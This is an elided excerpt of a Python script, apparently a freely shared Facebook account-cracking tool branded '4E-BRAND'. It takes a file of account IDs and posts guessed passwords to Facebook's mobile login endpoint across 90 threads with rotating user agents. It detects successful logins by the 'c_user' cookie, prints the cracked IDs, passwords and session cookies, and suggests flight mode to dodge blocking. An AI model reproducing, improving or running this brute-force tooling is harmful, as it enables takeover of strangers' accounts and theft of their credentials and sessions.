...
import requests,os,sys,time,json,random,re,string,platform,base64,platform
try:
	import requests
...
def fia():    
			print(logo)
			print('\033[1;31m                 THIS TOOL IS FREE')
			linex()
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('\033[1;32mExample : /sdcard/BRAND.txt')
				linex()
				...
				with tred(max_workers=90) as crack_submit:
					...
					print(logo)
					print(f'\033[1;37mTOTAL ACCOUNTS : \033[1;32m'+total_ids+f'\n')
					print('\033[1;32mPLEASE WAIT, PROCESS IS RUNNING IN THE BACKGROUND')
					print('\033[1;31mUSED FLIGHT MODE✈️')
					total_ids = str(len(fo))
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[ 4E-BRAND] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			HUZI=session.cookies.get_dict().keys()
			if "c_user" in HUZI:
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[4E-BRAND] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97m4E-BRAND\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
    ...
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
			...
			lo = session.post('https://mbasic.facebook.com/device-based/login/async/?refsrc=deprecated&lwv=100' ,data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\33[38;5;208m[BRAND-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[BRAND-OK] '+cid+' | '+ps+'\33[0;97m')
